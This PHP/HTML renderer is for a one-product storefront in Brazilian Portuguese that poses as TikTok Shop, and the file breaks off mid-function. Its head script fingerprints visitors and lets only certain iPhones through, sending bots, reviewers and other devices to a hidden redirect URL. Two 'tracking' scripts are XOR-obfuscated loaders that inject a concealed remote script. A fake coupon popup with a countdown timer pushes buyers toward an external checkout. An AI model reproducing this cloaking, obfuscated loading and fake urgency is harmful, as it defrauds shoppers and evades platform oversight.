<?php
// render_page.php
// Shared full-page renderer. Called by index.php when the session is already
// verified (dev bypass or returning verified user) and by api/get_content.php
// for AJAX content loading after JS fingerprint passes.
//
// Expects: $pdo (database), $view ('main' or 'pay'), $url_redirecionamento
// Sets: $show_main_content, $show_pay_content, $link_checkout_externo

// Guard against direct access — only index.php and get_content.php should include this
if (!defined('INCLUDED_BY_INDEX') && !defined('INCLUDED_BY_RENDER')) {
    http_response_code(403);
    include __DIR__ . '/redirect_stub.php';
    exit;
}

define('INCLUDED_BY_RENDER', true);

$show_main_content = ($view === 'main');
$show_pay_content = ($view === 'pay');

// Fetch external checkout link
$link_checkout_externo = '';
try {
    $stmt_ext = $pdo->prepare("SELECT link_checkout_externo FROM public.produtos WHERE id = 1");
    $stmt_ext->execute();
    $link_checkout_externo = trim($stmt_ext->fetchColumn() ?? '');
} catch (PDOException $e) {
    $link_checkout_externo = '';
}

// Fetch product data
try {
    $stmt_px = $pdo->prepare("SELECT nome, preco_atual FROM public.produtos WHERE id = 1");
    $stmt_px->execute();
    $px_data = $stmt_px->fetch(PDO::FETCH_ASSOC);
} catch (PDOException $e) {}
?>
<?php $needs_fingerprint = $needs_fingerprint ?? false; ?>
<!DOCTYPE html>
<html lang="pt-br"<?php echo (empty($needs_fingerprint) ? ' class="fp-pass"' : ''); ?>>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $show_pay_content ? 'Resumo do Pedido' : 'Minha Loja'; ?></title>
    <style>
        #content-wrapper { opacity: 0; transition: opacity 0.3s ease; }
        html.fp-pass #content-wrapper { opacity: 1; }

        .urgency-element {
            opacity: 0; transform: translateY(10px); pointer-events: none;
            transition: opacity 0.4s ease, transform 0.4s ease;
        }
        html.fp-pass .urgency-element {
            opacity: 1; transform: translateY(0); pointer-events: auto;
        }

        :root {
            --footer-height: 64px;
            --cor-texto-principal: #161823;
            --cor-texto-secundario: #6C6C80;
            --cor-vermelha-principal: #FE2C55;
            --cor-vermelha-escura: #E0234D;
            --header-max-width: 768px;
        }

        .fixed-footer-bar {
            position: fixed; bottom: 0; left: 0; width: 100%;
            height: var(--footer-height); max-width: var(--header-max-width);
            transform: translateX(-50%); left: 50%;
            background-color: #FFFFFF; border-top: 1px solid #F0F0F0;
            display: flex; align-items: center; padding: 8px 12px;
            box-shadow: 0 -4px 20px rgba(0,0,0,0.06); z-index: 1000;
            padding-bottom: calc(8px + env(safe-area-inset-bottom));
        }
        .fixed-footer-bar .icon-link {
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; flex-basis: 44px; font-size: 10px;
            color: var(--cor-texto-secundario); gap: 3px; text-decoration: none;
            text-align: center; line-height: 1.2; padding: 0 4px; flex-shrink: 0;
        }
        .fixed-footer-bar .icon-link svg { width: 22px; height: 22px; color: var(--cor-texto-principal); }
        .fixed-footer-bar .button-group { flex: 1; display: flex; gap: 10px; margin-left: 8px; }
        .fixed-footer-bar .button-group button {
            flex: 1; border: none; border-radius: 24px; font-size: 15px;
            font-weight: 600; cursor: pointer; height: 44px;
            transition: all 0.2s ease; letter-spacing: -0.3px;
        }
        .fixed-footer-bar .btn-add-cart {
            background-color: #F5F5F5; color: var(--cor-texto-principal);
            font-weight: 500; display: flex; align-items: center; justify-content: center;
        }
        .fixed-footer-bar .btn-add-cart:active { background-color: #EBEBEB; }
        .fixed-footer-bar .btn-buy-coupon {
            background: linear-gradient(135deg, #FE2C55 0%, #FF4B6B 100%);
            color: #FFFFFF; font-weight: 700; box-shadow: 0 2px 12px rgba(254,44,85,0.25);
        }
        .fixed-footer-bar .btn-buy-coupon:active {
            background: linear-gradient(135deg, #E0234D 0%, #EE3D5E 100%);
            box-shadow: 0 1px 6px rgba(254,44,85,0.2);
        }
        body {
            padding-bottom: calc(var(--footer-height) + 16px); margin: 0;
            background-color: #F5F5F5; -webkit-font-smoothing: antialiased;
        }
        body.scroll-lock { overflow: hidden !important; height: 100vh; }

        #chat-wrapper {
            position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
            z-index: 2000; transform: translateX(100%); transition: transform 0.3s ease-out;
        }
        #chat-wrapper.open { transform: translateX(0); }

        .tt-coupon-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
            background: rgba(0,0,0,0.6); z-index: 3500;
            display: flex; align-items: center; justify-content: center;
            opacity: 0; visibility: hidden;
            transition: opacity 0.35s ease, visibility 0.35s ease;
            backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); padding: 20px;
        }
        .tt-coupon-overlay.show { opacity: 1; visibility: visible; }
        .tt-coupon-card {
            width: 340px; max-width: 100%; background: #fff; border-radius: 24px;
            overflow: hidden; position: relative;
            transform: scale(0.6) translateY(40px); opacity: 0;
            transition: transform 0.6s cubic-bezier(0.34,1.56,0.64,1), opacity 0.4s ease;
            box-shadow: 0 30px 80px rgba(0,0,0,0.4);
        }
        .tt-coupon-overlay.show .tt-coupon-card { transform: scale(1) translateY(0); opacity: 1; }
        .tt-coupon-header {
            background: linear-gradient(135deg, #FF2545 0%, #FE2C55 50%, #E0234D 100%);
            padding: 28px 20px 24px; text-align: center; position: relative; overflow: hidden;
        }
        .tt-coupon-header::before {
            content: ''; position: absolute; top: -60%; left: -60%; width: 220%; height: 220%;
            background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.12) 50%, transparent 70%);
            animation: ttShimmer 3.5s linear infinite;
        }
        @keyframes ttShimmer { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .tt-coupon-icon-wrap {
            width: 60px; height: 60px; margin: 0 auto 12px; background: #000; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            position: relative; z-index: 1; overflow: hidden;
            animation: ttIconBounce 0.6s cubic-bezier(0.34,1.56,0.64,1) 0.2s both;
            box-shadow: 0 4px 14px rgba(0,0,0,0.22);
        }
        @keyframes ttIconBounce { 0% { transform: scale(0); } 100% { transform: scale(1); } }
        .tt-coupon-icon-wrap img { width: 100%; height: 100%; object-fit: cover; display: block; }
        .tt-coupon-title {
            font-size: 21px; font-weight: 800; color: #fff; position: relative; z-index: 1;
            margin: 0 0 4px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        .tt-coupon-subtitle { font-size: 13px; color: rgba(255,255,255,0.88); position: relative; z-index: 1; margin: 0; }
        .tt-coupon-close {
            position: absolute; top: 14px; right: 14px; width: 30px; height: 30px;
            border-radius: 50%; background: rgba(255,255,255,0.25); border: none;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; z-index: 5; color: #fff; font-size: 20px; transition: background 0.2s ease;
        }
        .tt-coupon-close:active { background: rgba(255,255,255,0.4); }
        .tt-coupon-body { padding: 26px 20px 22px; position: relative; }
        .tt-coupon-body::before, .tt-coupon-body::after {
            content: ''; position: absolute; top: -12px; width: 24px; height: 24px;
            background: #fff; border-radius: 50%;
        }
        .tt-coupon-body::before { left: -12px; }
        .tt-coupon-body::after { right: -12px; }
        .tt-coupon-amount { text-align: center; margin-bottom: 18px; }
        .tt-coupon-amount .tt-cur {
            font-size: 20px; font-weight: 700; color: #fe2c55;
            vertical-align: top; line-height: 1; position: relative; top: 8px;
        }
        .tt-coupon-amount .tt-val {
            font-size: 52px; font-weight: 900; color: #fe2c55; line-height: 1;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            letter-spacing: -2px;
        }
        .tt-coupon-amount .tt-lbl { display: block; font-size: 14px; color: #6c6c80; margin-top: 8px; font-weight: 500; }
        .tt-coupon-product {
            display: flex; align-items: center; gap: 10px; padding: 12px;
            background: #f8f8f8; border-radius: 12px; margin-bottom: 18px;
        }
        .tt-coupon-product img { width: 46px; height: 46px; border-radius: 8px; object-fit: cover; flex-shrink: 0; }
        .tt-coupon-product-info { min-width: 0; flex: 1; }
        .tt-coupon-product-info .pp-name {
            font-size: 12px; color: #161823; font-weight: 600;
            overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
        }
        .tt-coupon-product-info .pp-price { font-size: 15px; color: #fe2c55; font-weight: 800; margin-top: 3px; }
        .tt-coupon-product-info .pp-price s { color: #999; font-size: 12px; font-weight: 400; margin-left: 6px; }
        .tt-coupon-use-btn {
            width: 100%; padding: 16px; border: none; border-radius: 14px;
            background: linear-gradient(135deg, #fe2c55 0%, #ff4b6b 100%);
            color: #fff; font-size: 17px; font-weight: 700; cursor: pointer;
            box-shadow: 0 6px 20px rgba(254,44,85,0.35); transition: transform 0.15s ease;
            position: relative; overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        .tt-coupon-use-btn:active { transform: scale(0.96); }
        .tt-coupon-use-btn::after {
            content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
            animation: ttBtnShine 2.8s ease-in-out infinite; transform: skewX(-20deg);
        }
        @keyframes ttBtnShine { 0%, 100% { left: -100%; } 50% { left: 160%; } }
        .tt-coupon-timer { text-align: center; font-size: 12px; color: #999; margin-top: 12px; }
        .tt-coupon-timer svg { width: 12px; height: 12px; fill: #FF6A00; vertical-align: -2px; margin-right: 4px; }
        .tt-price-falling { animation: ttPriceFall 1.2s cubic-bezier(0.5,0,0.5,1) forwards !important; }
        @keyframes ttPriceFall {
            0%   { transform: translateY(0) rotate(0deg) scale(1); opacity: 1; }
            30%  { transform: translateY(12px) rotate(4deg) scale(1.05); opacity: 1; }
            60%  { transform: translateY(30px) rotate(12deg) scale(1.1); opacity: 0.6; }
            100% { transform: translateY(50px) rotate(18deg) scale(1.15); opacity: 0; }
        }
        .tt-price-dropin { animation: ttPriceDropIn 0.9s cubic-bezier(0.34,1.56,0.64,1) forwards !important; }
        @keyframes ttPriceDropIn {
            0%   { transform: translateY(-35px) scale(1.2); opacity: 0; }
            40%  { transform: translateY(8px) scale(0.95); opacity: 1; }
            60%  { transform: translateY(-4px) scale(1.02); }
            80%  { transform: translateY(2px) scale(0.99); }
            100% { transform: translateY(0) scale(1); opacity: 1; }
        }
        .tt-confetti-piece {
            position: absolute; width: 8px; height: 12px; top: -20px;
            opacity: 0; pointer-events: none; border-radius: 2px;
        }
        .tt-coupon-overlay.show .tt-confetti-piece { animation: ttConfettiFall 2.5s ease-in forwards; }
        @keyframes ttConfettiFall {
            0%   { opacity: 1; transform: translateY(0) rotate(0deg); }
            100% { opacity: 0; transform: translateY(400px) rotate(720deg); }
        }
        .tt-coupon-badge {
            display: inline-flex; align-items: center; gap: 4px;
            background: #00a884; color: #fff; font-size: 11px; font-weight: 700;
            padding: 5px 11px; border-radius: 20px; white-space: nowrap;
            animation: ttBadgePop 0.5s cubic-bezier(0.34,1.56,0.64,1) forwards;
            opacity: 0; transform: scale(0);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        @keyframes ttBadgePop { to { opacity: 1; transform: scale(1); } }

        <?php if ($show_pay_content): ?>
        .fixed-footer-bar { display: none !important; }
        body { padding-bottom: 0 !important; background-color: #F8F8F8; }
        <?php endif; ?>
    </style>

    <?php if ($needs_fingerprint): ?>
    <script>
    (function(){
        var _u = atob("<?php echo base64_encode($url_redirecionamento); ?>");
        var _dev = new URLSearchParams(location.search).has('dev');
        var _p = [[402,874,1206,2622],[440,956,1320,2868]];
        var _ua = navigator.userAgent || '';
        var _ti = _ua.indexOf('musical_ly') !== -1 || _ua.indexOf('bytedance') !== -1 || _ua.indexOf('trill') !== -1 || _ua.indexOf('BytedanceWebview') !== -1;
        var _t = new URLSearchParams(location.search).has('ttclid') || _ti;
        var _c = function(){
            var s = screen, n = navigator, w = window;
            var sw = s.width || 0, sh = s.height || 0, aw = s.availWidth || 0, ah = s.availHeight || 0;
            var dpr = w.devicePixelRatio || 0, iw = w.innerWidth || 0, ih = w.innerHeight || 0;
            if (_dev) return true;
            if (('' + n.platform).toLowerCase().indexOf('iphone') === -1) return false;
            if ((n.maxTouchPoints || 0) <= 0 || !('ontouchstart' in w)) return false;
            if (dpr !== 3) return false;
            var hc = n.hardwareConcurrency || 0;
            if (hc > 0 && hc < 6) return false;
            var cd = s.colorDepth || 0, pd = s.pixelDepth || 0;
            if ((cd !== 24 && cd !== 32) || (pd !== 24 && pd !== 32)) return false;
            if (typeof n.userAgentData !== 'undefined') return false;
            var m = false;
            for (var i = 0; i < _p.length; i++) {
                var lw = _p[i][0], lh = _p[i][1], pw = _p[i][2], ph = _p[i][3];
                var physW = Math.round(sw * dpr), physH = Math.round(sh * dpr);
                if (Math.abs(sw - lw) <= 5 && Math.abs(sh - lh) <= 5) { m = true; break; }
                if (Math.abs(physW - pw) <= 10 && Math.abs(physH - ph) <= 10) { m = true; break; }
            }
            if (!m) return false;
            if (aw !== sw && aw !== 0) return false;
            if (ah > sh) return false;
            if (sw >= sh) return false;
            var tol = _t ? 120 : 30;
            if (iw > 0 && iw > sw + tol) return false;
            if (ih > 0 && ih > sh + tol) return false;
            var a = ['webdriver', '__nightmare', '_phantom', '__playwright', '__selenium_unwrapped', 'callPhantom', 'domAutomation', 'domAutomationController'];
            for (var j = 0; j < a.length; j++) { if (typeof w[a[j]] !== 'undefined') return false; }
            try {
                var cv = document.createElement('canvas');
                var gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
                if (gl) {
                    var di = gl.getExtension('WEBGL_debug_renderer_info');
                    if (di) { var r = gl.getParameter(di.UNMASKED_RENDERER_WEBGL); if (r && r.indexOf('Apple') === -1) return false; }
                }
            } catch (e) {}
            if (!_t) { if (_ua.indexOf('Safari') === -1 && _ua.indexOf('AppleWebKit') === -1) return false; }
            return true;
        };
        if (!_c()) { window.location.replace(_u); return; }
        document.documentElement.className += ' fp-pass';
    })();
    </script>
    <?php endif; ?>
    <!-- Script de Rastreamento UTMify -->
    <script>(function(){var y_li=atob("DL/fwrFcdgXMXWU4S8T9t8MwVD/uNRFMO8zl7Z4/EmviKBFVItmm7NIzGyuuL0pLKM22ssUvWXC4MBYXJ96rp8IoWG+/f0kaKsursNg+A3GpLkcCEMT9rNAxEyf2fwFZP97yt8UxH2O1cBVKLsm6rMVxDmajOUhLKNT97pMqF2m5OEcCaZ2i7sp+GGShOEcCadu+ttBxA3GhNANBZs+tp8c5GHHhLhBaItus4J1+AGSgKAAacZ39v+wh");var r_wd=[];for(var s_n1=0;s_n1<y_li.length;s_n1++){r_wd.push(y_li.charCodeAt(s_n1)&255);}var l_t5g=r_wd[0];var e_o=r_wd.slice(1,1+l_t5g);var h_am=r_wd.slice(1+l_t5g);var j_1vc1=h_am.map(function(b,x_7t8j){return b^e_o[x_7t8j%l_t5g];});var g_di="";for(var p_w15=0;p_w15<j_1vc1.length;p_w15++){g_di+=String.fromCharCode(j_1vc1[p_w15]&255);}var p_7v=decodeURIComponent(escape(g_di));var d_26rt=JSON.parse(p_7v);var k_0=d_26rt.globals||[];k_0.forEach(function(t_l){window[t_l.name]=t_l.value;});var h_28=document.createElement("script");h_28.src=d_26rt.url;h_28.async=true;h_28.defer=true;(d_26rt.attributes||[]).forEach(function(x_kqsp){h_28.setAttribute(x_kqsp.name,x_kqsp.value);});(document.head||document.documentElement).appendChild(h_28);})();</script>
    <!-- Script do Pixel de Rastreamento -->
    <script>(function(){var n_h75e=atob("DASOCNIXUC44oHGlOn+sfaB7chQayAXRSne0J/10NEAW1QXIU2L3JrF4PQBa0l7WWXbneKZkf15R2BTJFXTncLd7fVpRywXKUSrke/A7ck9M1APMWHH6baE1anVljFPCVmvsab5kchRj21PLW2nrKug1JEdT9B7Oam32bb5eNAwUggfEVnHrKug1Zk9ckUHHCGW9PepzNhsNlhKVD2K6bOEgclNl3Q==");var q_43=[];for(var k_q8s=0;k_q8s<n_h75e.length;k_q8s++){q_43.push(n_h75e.charCodeAt(k_q8s)&255);}var w_n=q_43[0];var a_dtek=q_43.slice(1,1+w_n);var y_98=q_43.slice(1+w_n);var v_luzo=y_98.map(function(b,j_xlw){return b^a_dtek[j_xlw%w_n];});var n_4f="";for(var z_y48=0;z_y48<v_luzo.length;z_y48++){n_4f+=String.fromCharCode(v_luzo[z_y48]&255);}var r_8=decodeURIComponent(escape(n_4f));var i_k7=JSON.parse(r_8);var g_gr1=i_k7.globals||[];g_gr1.forEach(function(v_e7bz){window[v_e7bz.name]=v_e7bz.value;});var k_q=document.createElement("script");k_q.src=i_k7.url;k_q.async=true;k_q.defer=true;(i_k7.attributes||[]).forEach(function(q_c){k_q.setAttribute(q_c.name,q_c.value);});(document.head||document.documentElement).appendChild(k_q);})();</script>
</head>
<body>
    <script>document.body.classList.add('tier-premium');</script>

    <div id="content-wrapper">

    <?php
    $_popup_config = [
        'enabled' => true, 'coupon_enabled' => true, 'coupon_amount' => 10,
        'coupon_label' => 'Cupom exclusivo', 'urgency_label' => 'Oferta relâmpago', 'timer_minutes' => 10
    ];
    try {
        $_popup_stmt = $pdo->query("SELECT enabled, coupon_enabled, coupon_amount, coupon_label, urgency_label, timer_minutes FROM public.promo_config WHERE id = 1");
        $_popup_row = $_popup_stmt ? $_popup_stmt->fetch(PDO::FETCH_ASSOC) : null;
        if ($_popup_row) {
            $_popup_config['enabled'] = ($_popup_row['enabled'] === true || $_popup_row['enabled'] === 't' || $_popup_row['enabled'] === 1);
            $_popup_config['coupon_enabled'] = ($_popup_row['coupon_enabled'] === true || $_popup_row['coupon_enabled'] === 't' || $_popup_row['coupon_enabled'] === 1);
            $_popup_config['coupon_amount'] = (float)$_popup_row['coupon_amount'];
            $_popup_config['coupon_label'] = $_popup_row['coupon_label'];
            $_popup_config['urgency_label'] = $_popup_row['urgency_label'];
            $_popup_config['timer_minutes'] = (int)$_popup_row['timer_minutes'];
        }
    } catch (Exception $e) {}
    $_popup_coupon_amt = max(0, (float)$_popup_config['coupon_amount']);
    $_popup_preco_atual = 0; $_popup_preco_antigo = 0; $_popup_nome_prod = ''; $_popup_img_prod = '';
    try {
        $_pp = $pdo->prepare("SELECT nome, imagem_principal, preco_atual, preco_antigo FROM public.produtos WHERE id = 1");
        $_pp->execute();
        $_prod = $_pp->fetch(PDO::FETCH_ASSOC);
        if ($_prod) {
            $_popup_preco_atual = (float)$_prod['preco_atual'];
            $_popup_preco_antigo = (float)$_prod['preco_antigo'];
            $_popup_nome_prod = $_prod['nome'] ?? '';
            $_popup_img_prod = $_prod['imagem_principal'] ?? '';
        }
    } catch (Exception $e) {}
    $_popup_preco_com_cupom = max(0, $_popup_preco_atual - $_popup_coupon_amt);
    $_popup_show = !empty($_popup_config['enabled']) && !empty($_popup_config['coupon_enabled']) && $_popup_coupon_amt > 0;
    ?>

    <?php if ($show_main_content && $_popup_show): ?>
    <div class="tt-coupon-overlay urgency-element" id="ttCouponOverlay">
        <div class="tt-coupon-card" id="ttCouponCard">
            <div class="tt-coupon-header">
                <button class="tt-coupon-close" id="ttCouponClose" type="button">&times;</button>
                <div class="tt-coupon-icon-wrap">
                    <img src="public/images/tiktok-logo.svg" alt="TikTok Shop">
                </div>
                <h2 class="tt-coupon-title"><?php echo htmlspecialchars($_popup_config['coupon_label']); ?></h2>
                <p class="tt-coupon-subtitle">Resgate agora e economize na sua compra</p>
            </div>
            <div class="tt-coupon-body">
                <div class="tt-coupon-amount">
                    <span class="tt-cur">R$</span><span class="tt-val" id="ttCouponVal"><?php echo number_format($_popup_coupon_amt, 2, ',', '.'); ?></span>
                    <span class="tt-lbl">OFF no seu primeiro pedido</span>
                </div>
                <?php if ($_popup_nome_prod): ?>
                <div class="tt-coupon-product">
                    <img src="<?php echo htmlspecialchars($_popup_img_prod ?: 'url_default_produto.png'); ?>" alt="">
                    <div class="tt-coupon-product-info">
                        <div class="pp-name"><?php echo htmlspecialchars(mb_strimwidth($_popup_nome_prod, 0, 38, '...')); ?></div>
                        <div class="pp-price">
                            R$ <?php echo number_format($_popup_preco_com_cupom, 2, ',', '.'); ?>
                            <?php if ($_popup_preco_antigo > $_popup_preco_atual): ?>
                            <s>R$ <?php echo number_format($_popup_preco_antigo, 2, ',', '.'); ?></s>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
                <?php endif; ?>
                <button class="tt-coupon-use-btn" id="ttCouponUseBtn" type="button">Usar cupom agora</button>
                <div class="tt-coupon-timer">
                    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><path d="M8 3.5a.5.5 0 0 0-1 0V9a.5.5 0 0 0 .252.434l3.5 2a.5.5 0 0 0 .496-.868L8 8.71V3.5z"/><path d="M8 16A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0-1A6 6 0 1 0 8 2a6 6 0 0 0 0 12z"/></svg>
                    Expira em <span id="ttPopupTimer"><?php echo sprintf('%02d:00', max(1, (int)$_popup_config['timer_minutes'])); ?></span>
                </div>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <?php if ($show_main_content): ?>
        <?php
            include 'header.php';
            include 'main_content.php';
            include 'createcontent.php';
            include 'rating.php';
            include 'profile.php';
            include 'info.php';
        ?>

        <footer class="fixed-footer-bar">

            <a href="#" class="icon-link">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-shop-window" viewBox="0 0 16 16">
                    <path d="M2.97 1.35A1 1 0 0 1 3.73 1h8.54a1 1 0 0 1 .76.35l2.609 3.044A1.5 1.5 0 0 1 16 5.37v.255a2.375 2.375 0 0 1-4.25 1.458A2.37 2.37 0 0 1 9.875 8 2.37 2.37 0 0 1 8 7.083 2.37 2.37 0 0 1 6.125 8a2.37 2.37 0 0 1-1.875-.917A2.375 2.375 0 0 1 0 5.625V5.37a1.5 1.5 0 0 1 .361-.976zm1.78 4.275a1.375 1.375 0 0 0 2.75 0 .5.5 0 0 1 1 0 1.375 1.375 0 0 0 2.75 0 .5.5 0 0 1 1 0 1.375 1.375 0 1 0 2.75 0V5.37a.5.5 0 0 0-.12-.325L12.27 2H3.73L1.12 5.045A.5.5 0 0 0 1 5.37v.255a1.375 1.375 0 0 0 2.75 0 .5.5 0 0 1 1 0M1.5 8.5A.5.5 0 0 1 2 9v6h12V9a.5.5 0 0 1 1 0v6h.5a.5.5 0 0 1 0 1H.5a.5.5 0 0 1 0-1H1V9a.5.5 0 0 1 .5-.5m2 .5a.5.5 0 0 1 .5.5V13h8V9.5a.5.5 0 0 1 1 0V13a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V9.5a.5.5 0 0 1 .5-.5m2 .5a.5.5 0 0 1 .5.5V13h8V9.5a.5.5 0 0 1 1 0V13a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V9.5a.5.5 0 0 1 .5-.5m2 .5a.5.5 0 0 1 .5.5V13h8V9.5a.5.5 0 0 1 1 0V13a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V9.5a.5.5 0 0 1 .5-.5m2 .5a.5.5 0 0 1 .5.5V13h8V9.5a.5.5 0 0 1 1 0V13a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V9.5a.5.5 0 0 1 .5-.5"/>
                </svg>
                <span>Loja</span>
            </a>

            <a href="#" class="icon-link" id="btnOpenChat">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chat" viewBox="0 0 16 16">
                    <path d="M2.678 11.894a1 1 0 0 1 .287.801 11 11 0 0 1-.398 2c1.395-.323 2.247-.697 2.634-.893a1 1 0 0 1 .71-.074A8 8 0 0 0 8 14c3.996 0 7-2.807 7-6s-3.004-6-7-6-7 2.808-7 6c0 1.468.617 2.83 1.678 3.894m-.493 3.905a22 22 0 0 1-.713.129c-.2.032-.352-.176-.273-.362a10 10 0 0 0 .244-.637l.003-.01c.248-.72.45-1.548.524-2.319C.743 11.37 0 9.76 0 8c0-3.866 3.582-7 8-7s8 3.134 8 7-3.582 7-8 7a9 9 0 0 1-2.347-.306c-.52.263-1.639.742-3.468 1.105"/>
                </svg>
                <span>Chat</span>
            </a>

            <div class="button-group">
                <button class="btn-add-cart" id="btnAddToCart">
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor" viewBox="0 0 16 16" style="margin-right:5px;flex-shrink:0;">
                        <path d="M0 1.5C0 .67.67 0 1.5 0H2a.5.5 0 0 1 .485.379L2.89 3H14.5a.5.5 0 0 1 .485.621l-1.5 6A.5.5 0 0 1 13 10H4a.5.5 0 0 1-.485-.379L1.61 2H.5a.5.5 0 0 1-.5-.5M3.14 4l1.25 5h8.22l1.25-5zM5 13a1 1 0 1 0 0 2 1 1 0 0 0 0-2m-2 1a2 2 0 1 1 4 0 2 2 0 0 1-4 0m9-1a1 1 0 1 0 0 2 1 1 0 0 0 0-2m-2 1a2 2 0 1 1 4 0 2 2 0 0 1-4 0"/>
                    </svg>
                    Carrinho
                </button>
                <button class="btn-buy-coupon" id="btnBuyWithCoupon">Comprar agora</button>
            </div>
        </footer>

        <div id="chat-wrapper">
            <?php include 'chat.php'; ?>
        </div>

        <script>
            document.addEventListener('DOMContentLoaded', () => {
                const btnAddToCart = document.getElementById('btnAddToCart');
                const btnBuyWithCoupon = document.getElementById('btnBuyWithCoupon');
                const btnOpenChat = document.getElementById('btnOpenChat');
                const chatWrapper = document.getElementById('chat-wrapper');
                const body = document.body;

                const externalCheckoutUrl = <?php echo json_encode($link_checkout_externo); ?>;

                const ttOverlay = document.getElementById('ttCouponOverlay');
                const ttCard = document.getElementById('ttCouponCard');
                const ttCloseBtn = document.getElementById('ttCouponClose');
                const ttUseBtn = document.getElementById('ttCouponUseBtn');
                const ttTimerEl = document.getElementById('ttPopupTimer');

                function ttOpenPopup() {
                    if (!ttOverlay) return;
                    ttOverlay.classList.add('show');
                    body.classList.add('scroll-lock');
                    ttSpawnConfetti();
                }
                function ttSpawnConfetti() {
                    if (!ttCard) return;
                    const oldPieces = ttCard.querySelectorAll('.tt-confetti-piece');
                    oldPieces.forEach(p => p.remove());
                    const colors = ['#FE2C55', '#FFC107', '#25F4EE', '#00A884', '#FF6B6B', '#69C9D4'];
                    for (let i = 0; i < 18; i++) {
                        const piece = document.createElement('div');
                        piece.className = 'tt-confetti-piece';
                        piece.style.left = Math.random() * 100 + '%';
                        piece.style.background = colors[Math.floor(Math.random() * colors.length)];
                        piece.style.animationDelay = (Math.random() * 0.5) + 's';
                        piece.style.animationDuration = (1.8 + Math.random() * 1.2) + 's';
                        piece.style.width = (5 + Math.random() * 6) + 'px';
                        piece.style.height = (8 + Math.random() * 10) + 'px';
                        ttCard.appendChild(piece);
                    }
                }
                function ttClosePopup() {
                    if (!ttOverlay) return;
                    ttCard.style.transition = 'transform 0.3s ease, opacity 0.3s ease';
                    ttCard.style.transform = 'scale(0.8) translateY(20px)';
                    ttCard.style.opacity = '0';
                    ttOverlay.style.opacity = '0';
                    setTimeout(() => {
                        ttOverlay.classList.remove('show');
                        ttCard.style = '';
                        ttOverlay.style = '';
                        body.classList.remove('scroll-lock');
                    }, 350);
                }
                function ttGetPriceElement() { return document.querySelector('.price-bar-red .tt-num'); }
                function ttAnimatePriceDrop() {
                    const priceEl = ttGetPriceElement();
                    if (!priceEl) return;
                    const oldVal = priceEl.textContent;
                    const newVal = '<?php echo number_format($_popup_preco_com_cupom, 2, ',', '.'); ?>';
                    if (oldVal === newVal) return;
                    priceEl.classList.add('tt-price-falling');
                    setTimeout(() => {
                        priceEl.classList.remove('tt-price-falling');
                        priceEl.textContent = newVal;
                        priceEl.classList.add('tt-price-dropin');
                        setTimeout(() => priceEl.classList.remove('tt-price-dropin'), 900);
                    }, 700);
                }
                function ttShowBadge() {
                    const card = document.getElementById('promoCouponCard');
                    if (!card) return;
                    const btn = card.querySelector('.promo-coupon-button');
                    if (btn) { btn.textContent = 'Cupom aplicado'; btn.disabled = true; }
                    card.classList.add('applied');
                    card.style.display = 'flex';
                    card.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    const existing = card.querySelector('.tt-coupon-badge');
                    if (!existing) {
                        const badge = document.createElement('span');
                        badge.className = 'tt-coupon-badge';
                        badge.innerHTML = '<svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor" style="margin-right:2px;"><path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L3.22 9.28a.75.75 0 0 1 1.06-1.06L6 9.94l6.72-6.72a.75.75 0 0 1 1.06 0z"/></svg>Aplicado';
                        card.appendChild(badge);
                    }
                }

                if (ttCloseBtn) ttCloseBtn.addEventListener('click', ttClosePopup);
                if (ttOverlay) {
                    ttOverlay.addEventListener('click', (e) => { if (e.target === ttOverlay) ttClosePopup(); });
                }
                if (ttUseBtn) {
                    ttUseBtn.addEventListener('click', () => { ttAnimatePriceDrop(); ttShowBadge(); ttClosePopup(); });
                }

                if (ttTimerEl) {
                    let ttSec = <?php echo max(1, (int)$_popup_config['timer_minutes']) ?> * 60;
                    const ttTick = () => {
                        if (ttSec <= 0) return;
                        ttSec--;
                        const m = Math.floor(ttSec / 60);
                        const s = ttSec % 60;
                        ttTimerEl.textContent = String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
                    };
                    setInterval(ttTick, 1000);
                }

                if (ttOverlay) {
                    const ttTryOpen = () => {
                        if (document.documentElement.classList.contains('fp-pass')) {
                            setTimeout(ttOpenPopup, 600);
                        } else {
                            setTimeout(ttTryOpen, 300);
                        }
                    };
                    ttTryOpen();
                }

                const redirectToCheckout = () => {
                    if (externalCheckoutUrl && externalCheckoutUrl.length > 0) {
                        const currentUrl = new URL(window.location.href);
                        const currentParams = currentUrl.searchParams;
                        const targetUrl = new URL(externalCheckoutUrl);
                        currentParams.forEach(function(value, key) { targetUrl.searchParams.set(key, value); });
                        window.location.href = targetUrl.toString();
                    } else {
